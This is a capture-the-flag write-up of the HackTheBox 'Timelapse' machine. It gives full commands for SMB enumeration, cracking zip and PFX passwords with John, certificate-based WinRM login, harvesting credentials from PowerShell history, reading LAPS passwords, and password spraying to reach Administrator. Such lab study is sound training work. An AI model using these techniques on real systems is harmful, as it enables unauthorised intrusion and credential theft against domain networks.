>[!tldr] Timelapse is an Easy #Windows machine, which involves accessing a publicly accessible #SMB share that contains a zip file. This zip file requires a password which can be cracked by using John. Extracting the zip file outputs a password encrypted PFX file, which can be cracked with John as well, by converting the PFX file to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted, which is used to login to the system over WinRM. After authentication we discover a PowerShell history file containing login credentials for the `svc_deploy` user. User enumeration shows that `svc_deploy` is part of a group named `LAPS_Readers`. The `LAPS_Readers` group has the ability to manage passwords in LAPS and any user in this group can read the local passwords for machines in the domain. By abusing this trust we retrieve the password for the Administrator and gain a WinRM session.


# Guided Mode
---
1. `What is the common name on TLS/SSL certificate returned from one of the open TCP ports on Timelapse?`
	1. First, ill start with a `nmap` scan in order to see the open ports.

```shell
sudo nmap -sS -p- 10.129.52.26 -T5
<SNIP>
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49688/tcp open  unknown
49696/tcp open  unknown
-
sudo nmap -sCV -p53,88,135,139,389,445 10.129.52.26 --script ssl-cert
<SNIP>
PORT    STATE SERVICE       VERSION
53/tcp  open  domain?
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-25 03:34:39Z)
135/tcp open  msrpc?
139/tcp open  netbios-ssn?
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
-
sudo nmap -sCV -p464,593,636,3268,3269,5986,9389,49667,49673,49674,49688,49696 10.129.52.26 --script ssl-cert -T5
<SNIP>
PORT      STATE SERVICE           VERSION
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  wsmans?
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:     e233 a199 4504 0859 013f b9c5 e4f6 91c3
| SHA-1:   5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
|_SHA-256: ec04 c023 ef31 4e12 e299 0242 ef00 9045 7626 19ff 2c75 0f04 9779 0f98 118f e81d
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  unknown
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  unknown
49688/tcp open  unknown
49696/tcp open  unknown
```
- As we can see off port `5986` we find the "commonName" to be `dc01.timelapse.htb` this is our flag
- Flag #1 -> `dc01.timelapse.htb`

---
2. `What TCP port is SMB running on?`
	1. By default it should be `139` or `445` and so by process of elimination i found the flag
- Flag #2 -> `445`

---
3. `What tool from the John The Ripper tool suite can be used to generate a hash that can be used by John The Ripper from a password-protected zip file to a format ?`
	1. Perform a Google search with the keywords "john crack zip file".
- Flag #3 -> `zip2john`

---
4. `What tool from the John The Ripper tool suite can be used to generate a hash that can be used by John The Ripper from a pfx file?`
	1. Perform a Google serach with the keywords "john the ripper hash from pfx file", I found the source code for `John The Ripper` suite and it has a python file called `pfx2john` which matches their normal syntax, this is our flag
- Flag #4 -> `pfx2john`

---
5. `What is the default port for the Windows Remote Management or WinRM service over HTTP (not HTTPS)?`
	1. Search with keywords such as "WinRM default http port".
- Flag #5 -> `5985`

---
6. `Using Evil-WinRM, the -c flag will allow the user to provide a certificate. What flag can be used to provide a private key?`
	1. Search with keywords such as "evil-win-rm doc" inside the github page we can see the help info, inside is the falg
- Flag #6 -> `-k`

---
7. `Submit the flag located on the legacyy user's desktop.`
	1. We know there is a SMB share so we will scan it for any non default shares, then enumerate
	
```shell
smbmap -H 10.129.52.26 -u anonymous
<SNIP>
[+] IP: 10.129.52.26:445	Name: 10.129.52.26        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	Shares                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share
[|] Closing connections..                                                              [/] Closing connections..
```
- From the output we acn see `Shares` which is non-default as well as read only, lets check it out

- We could download several files from the shares
```shell
.rw-r--r-- 1.1M gurt 24 Aug 16:13  LAPS.x64.msi
.rw-r--r-- 104k gurt 24 Aug 16:13  LAPS_Datasheet.docx
.rw-r--r-- 641k gurt 24 Aug 16:13  LAPS_OperationsGuide.docx
.rw-r--r--  73k gurt 24 Aug 16:13  LAPS_TechnicalSpecification.docx
.rw-r--r-- 2.6k gurt 24 Aug 16:13  winrm_backup.zip
```
- `winrm_backup.zip` requires a zip, but the previous questions lead us towards the answer. We have to get its hash to crack with `zip2john`
	1. `zip2john winrm_backup.zip > zip-hash.txt` : Hash is inside `zip-hash.txt`
	2. `john --wordlist=rockyou.txt zip-hash.txt` : Attempt to crack hash
		- If succesful go to next step
	3. `john --show zip-hash.txt` : Show password 
		1. `winrm_backup.zip/legacyy_dev_auth.pfx:supremelegacy:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip`: From this output, we can grab the password `supremelegacy`
		
- Now with the password we inflate the zip and get `legacyy_dev_auth.pfx`. Lets get that hash and crack it!
	- **Note:** `pfx2john` requires `python2`, if your system uses the default `python3` then you will get the wrong hash and it won't work.
	1. `pfx2john legacyy_dev_auth.pfx > pfx-hash.txt` : Hash is inside `pfx-hash.txt`
	2. `john --wordlist=rockyou.txt pfx-hash.txt` : Crack the hash
	3. `john --show pfx-hash.txt` : Password -> `thuglegacy`
	
- Now that we have `legacyy_dev_auth.pfx` we can use the password we just cracked
	1. `openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key` -> Get encrypted key
	2. `openssl rsa -in private.key -out decrypted.key` -> Get key
	3. `openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt` -> Get cert
- With the decrypted private key (`decrypted.key`) and Cert (`certificate.crt`) we should be able to use login to a service, question 5 leads us to the right place 
	- "Windows Remote Management or WinRM service over HTTP (not HTTPS)"
	- `evil-winrm-py -i 10.129.52.26 --priv-key-pem decrypted.key --cert-pem certificate.crt --ssl` -> Connect to user
- Inside the user I went to the desktop and got the flag
- User Flag -> `[REDACTED_FLAG]`

---
8. `What is the full path used to read PowerShell history file, starting from $env:?`
	1. With a quick google search we get the flag
- Flag #8 -> `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

---
9. `What user's password can be found in that PowerShell history file?`
	1. After reading from the powershell history file, with "type" I found two logs that seemed to be the password
		1. `$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force` -> Password `E3R$Q62^12p7PLlC%KWaxuaV`
		2. `$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)` -> This is the user
- Flag #9 -> `svc_deploy`:`E3R$Q62^12p7PLlC%KWaxuaV`

---
10. `What non-standard group is svc_deploy a part of?`
	1. We have to use the `net user <username>` command to get more info on our target

```Powershell
net user svc_deploy
<SNIP>
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
<SNIP>
```
- As we can see the non default group is `LAPS_Readers` which is our flag

---
11. `What is the acronym LAPS short for?`
	1. With a quick Google search I found out its
		1. "LAPS stands for *Local Administrator Password Solution*." 
- Flag #11 -> `Local Administrator Password Solution`

---
12. `What is the name of the property on an active directory computer object that contains the LAPS-generated password for the administrator account?`
	1. With a google search i found the answer
- Flag #12 -> `ms-mcs-AdmPwd`

---
- Root Flag:
	1. First, we login to `svc_deploy`:`E3R$Q62^12p7PLlC%KWaxuaV` 
		1. `evil-winrm-py -i 10.129.52.26 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --ssl` -> Login
	2. We know that our user is part of the group `LAPS_Readers`, which means we can use Local Administrator Password Solution (LAPS) to get passwords, this can be privilige escalation route
		1. `nxc ldap 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps` -> Grabs us a password from LAPS
		- Computer:`DC01$` 
		- User: ?
		- Password:`!)m0et[%QF3GVH136ZE+!NF#`
	3. We know that its the same computer and we know the password. I used `winpeas` wihch found me the users which i put into `users.txt`. I then found on hacktricks that you can use `crackmapexec`.
		1. `crackmapexec wmi 10.129.227.113 -d timelapse.htb -u users.txt -p '!)m0et[%QF3GVH136ZE+!NF#'` -> Password spraying!
		2. `timelapse.htb\Administrator:!)m0et[%QF3GVH136ZE+!NF# (Pwn3d!)` -> This is our password for administrator!!!
			1. `Administrator`:`!)m0et[%QF3GVH136ZE+!NF#`
	4. Now, lets login
		1. `evil-winrm-py -i 10.129.227.113 -u Administrator -p '!)m0et[%QF3GVH136ZE+!NF#' --ssl` -> It works
	5. Now as the administrator we need to get the flag from `TRX`'s desktop. I did lateral movement from the administrator, and got to the `root.txt`
- Root Flag -> `[REDACTED_FLAG]`

